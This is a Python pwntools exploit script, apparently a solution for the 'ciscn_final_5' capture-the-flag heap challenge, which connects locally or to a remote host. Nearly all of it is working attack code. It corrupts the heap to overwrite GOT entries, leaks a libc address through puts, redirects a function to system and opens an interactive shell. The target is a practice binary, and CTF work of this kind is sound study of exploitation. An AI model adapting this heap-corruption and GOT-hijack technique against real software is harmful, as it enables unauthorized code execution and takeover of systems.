#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./ciscn_final_5')
	elf = ELF('./ciscn_final_5',checksec=False)
	libc = ELF('./libc.so.6',checksec=False)
else:
	p = remote("node3.buuoj.cn",26107)
	elf = ELF('./ciscn_final_5',checksec=False)
	libc = ELF('./libc.so.6',checksec=False)


def menu(cmd):
    sla("your choice: ",str(cmd))

def add(idx,size,content):
    menu(1)
    sda("index: ",str(idx))
    sda("size: ",str(size))
    sda("content: ",content)

def delete(idx):
    menu(2)
    sla("index: ",str(idx))

def edit(idx,content):
    menu(3)
    sla("index: ",str(idx))
    sda("content: ",content)


###leak libc###
free_got = elf.got['free']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']
puts_plt = elf.symbols['puts']


payload = p64(0) + p64(0xf0)
add(16,0x10,payload)
add(1,0xc0,'bbbb')
add(2,0x30,';$0;')

delete(1)
delete(0)


payload = p64(0) + p64(0x21) + p64(0x6020E0)
add(3,0xe0,payload)


add(4,0xc0,'nothing')

payload = p64(free_got) + p64(puts_got+1) + p64(atoi_got-4) +p64(0) * 17 + p32(0x10) * 8
add(5,0xc0,payload)

edit(8,p64(puts_plt)*2)

delete(1)
puts = u64(ru('\x7f')[-6:].ljust(8,'\x00'))


libc_base = puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
success(hex(libc_base))

###get shell###
edit(4,p64(system)*2)
sl('$0;')

ia()

